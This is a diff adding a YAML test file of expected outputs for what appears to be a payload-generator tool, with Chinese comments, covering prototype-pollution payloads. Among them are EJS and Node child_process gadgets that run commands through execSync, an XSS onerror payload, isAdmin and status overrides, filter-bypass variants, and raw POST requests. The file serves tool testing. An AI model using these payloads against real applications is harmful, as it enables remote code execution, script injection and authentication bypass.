@@ -1,0 +1,253 @@
+# 原型链污染黄金样本（proto.generic.*）
+#
+# 纪律：下面每个 payload 都是**照着 body 手推**出来的——槽位代入、变量替换，
+# 再逐字符写下来；request 那两条的 Content-Length 是一个字节一个字节数出来的。
+# 不是跑一遍工具把输出粘回来的（那样只会把当前行为固化成规范）。
+#
+# 为什么专门有两条断言 request：原型链污染的载荷常常**必须整段作为请求体**。
+# 走 `json` 提交方式会被当成某个字段的字符串值塞进去（多一层引号、里面全部转义），
+# 目标那边的合并逻辑根本看不到 __proto__ 这个键。所以把 `json-body` 的输出钉住。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= JSON 合并污染 =================
+
+  - name: JSON 合并污染 __proto__ 任意属性
+    state:
+      vuln: proto
+      template: proto.generic.json.proto.merge
+      # prop / value 是自由变量，没有默认值，样本必须自己填
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: '{"__proto__":{"polluted":"yes"}}'
+      syntax: ok
+
+  - name: JSON 合并污染 constructor.prototype 回退
+    state:
+      vuln: proto
+      template: proto.generic.json.constructor.merge
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: '{"constructor":{"prototype":{"polluted":"yes"}}}'
+      syntax: ok
+
+  - name: JSON 双写绕过 __proto__ 过滤
+    state:
+      vuln: proto
+      template: proto.generic.json.bypass.doublewrite
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      # __pro__proto__to__ 里的 __proto__ 被过滤器删掉一次后，还原成 __proto__
+      payload: '{"__pro__proto__to__":{"polluted":"yes"}}'
+      syntax: ok
+
+  # ================= 污染成 XSS / RCE =================
+
+  - name: 污染 html 属性升级为 XSS
+    state:
+      vuln: proto
+      template: proto.generic.json.xss.html
+      vars: {js: "<img src=x onerror=alert(1)>"}
+      outputs: [raw]
+    expect:
+      payload: '{"__proto__":{"html":"<img src=x onerror=alert(1)>"}}'
+      syntax: ok
+
+  - name: EJS outputFunctionName 污染成 RCE
+    state:
+      vuln: proto
+      template: proto.generic.json.ejs.outputfunctionname
+      vars: {command: id}
+      outputs: [raw]
+    expect:
+      # 只替换 <<command>>，body 其余部分原样（含 x; 前缀和 ;s 后缀）
+      payload: |-
+        {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
+      syntax: ok
+
+  - name: EJS escapeFunction 污染成 RCE
+    state:
+      vuln: proto
+      template: proto.generic.json.ejs.escapefunction
+      vars: {command: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        {"__proto__":{"client":true,"escapeFunction":"1; return global.process.mainModule.require('child_process').execSync('id');"}}
+      syntax: ok
+
+  - name: Node child_process 污染成 RCE（shell + argv0 + NODE_OPTIONS + env）
+    state:
+      vuln: proto
+      template: proto.generic.json.node.argv0
+      vars: {command: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        {"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"console.log(require('child_process').execSync('id').toString())//"}}}
+      syntax: ok
+
+  - name: Node NODE_OPTIONS 污染（半条链）
+    state:
+      vuln: proto
+      template: proto.generic.json.node.nodeoptions
+      outputs: [raw]
+    expect:
+      # 无变量可填，整条 body 原样输出
+      payload: '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ"}}'
+      syntax: ok
+
+  - name: Node env 污染（半条链）
+    state:
+      vuln: proto
+      template: proto.generic.json.node.env
+      vars: {command: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        {"__proto__":{"env":{"EVIL":"require('child_process').execSync('id').toString()//"}}}
+      syntax: ok
+
+  # ================= 污染成逻辑绕过 / DoS =================
+
+  - name: 污染 isAdmin 绕过身份判断
+    state:
+      vuln: proto
+      template: proto.generic.json.logic.isadmin
+      vars: {prop: isAdmin}
+      outputs: [raw]
+    expect:
+      # 值是裸 true，不带引号——"true" 这种字符串过不了 === true 的判断
+      payload: '{"__proto__":{"isAdmin":true}}'
+      syntax: ok
+
+  - name: 污染 status 覆盖响应状态
+    state:
+      vuln: proto
+      template: proto.generic.json.logic.status
+      vars: {prop: status, n: "200"}
+      outputs: [raw]
+    expect:
+      # <<n>> 是裸数字位，写 "200" 会得到 {"status":"200"}，那是另一个东西
+      payload: '{"__proto__":{"status":200}}'
+      syntax: ok
+
+  # ================= 外层包装（两段式） =================
+
+  - name: 内层污染载荷包进业务字段
+    state:
+      vuln: proto
+      template: proto.generic.json.wrap.field
+      vars: {field: data}
+      # 嵌套载荷：外层 body 里的 <<payload>> 由它代入，发生在变量替换之后
+      nest: '{"__proto__":{"polluted":"yes"}}'
+      outputs: [raw]
+    expect:
+      payload: '{"data":{"__proto__":{"polluted":"yes"}}}'
+      syntax: ok
+
+  # ================= 整个 JSON 体的提交方式 =================
+
+  - name: 污染载荷作为整个 JSON 体提交（json-body 不加引号）
+    state:
+      vuln: proto
+      template: proto.generic.json.proto.merge
+      vars: {prop: polluted, value: "yes"}
+      submit: json-body
+      method: POST
+      host: example.com
+      path: /login
+      outputs: [request]
+    expect:
+      payload: '{"__proto__":{"polluted":"yes"}}'
+      outputs:
+        # 载荷 32 字节（纯 ASCII，字符数即字节数），Content-Length 按字节数写。
+        # 关键是 body 里没有引号包裹——走 json 提交方式会变成
+        # "{\"__proto__\":{\"polluted\":\"yes\"}}"，合并逻辑看不到 __proto__ 键
+        request: "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\nContent-Length: 32\r\n\r\n{\"__proto__\":{\"polluted\":\"yes\"}}"
+
+  - name: constructor 回退载荷作为整个 JSON 体提交
+    state:
+      vuln: proto
+      template: proto.generic.json.constructor.merge
+      vars: {prop: polluted, value: "yes"}
+      submit: json-body
+      method: POST
+      host: example.com
+      path: /api/user/update
+      outputs: [request]
+    expect:
+      outputs:
+        request: "POST /api/user/update HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\nContent-Length: 48\r\n\r\n{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}"
+
+  # ================= 查询串形态 =================
+
+  - name: 查询串污染 __proto__（方括号）
+    state:
+      vuln: proto
+      template: proto.generic.query.proto.bracket
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      # style 槽位取默认值 __proto__
+      payload: "__proto__[polluted]=yes"
+
+  - name: 查询串污染（大小写变体 __PROTO__）
+    state:
+      vuln: proto
+      template: proto.generic.query.proto.bracket
+      slots: {style: "__PROTO__"}
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "__PROTO__[polluted]=yes"
+
+  - name: 查询串污染（编码变体 %5f%5fproto%5f%5f）
+    state:
+      vuln: proto
+      template: proto.generic.query.proto.bracket
+      slots: {style: "%5f%5fproto%5f%5f"}
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "%5f%5fproto%5f%5f[polluted]=yes"
+
+  - name: 查询串污染 __proto__（点号）
+    state:
+      vuln: proto
+      template: proto.generic.query.proto.dot
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "__proto__.polluted=yes"
+
+  - name: 查询串污染 constructor.prototype（方括号）
+    state:
+      vuln: proto
+      template: proto.generic.query.constructor.bracket
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "constructor[prototype][polluted]=yes"
+
+  - name: 查询串污染 constructor.prototype（点号）
+    state:
+      vuln: proto
+      template: proto.generic.query.constructor.dot
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "constructor.prototype.polluted=yes"
+
+  - name: 查询串双写绕过 __proto__ 过滤
+    state:
+      vuln: proto
+      template: proto.generic.query.bypass.doublewrite
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "__pro__proto__to__[polluted]=yes"
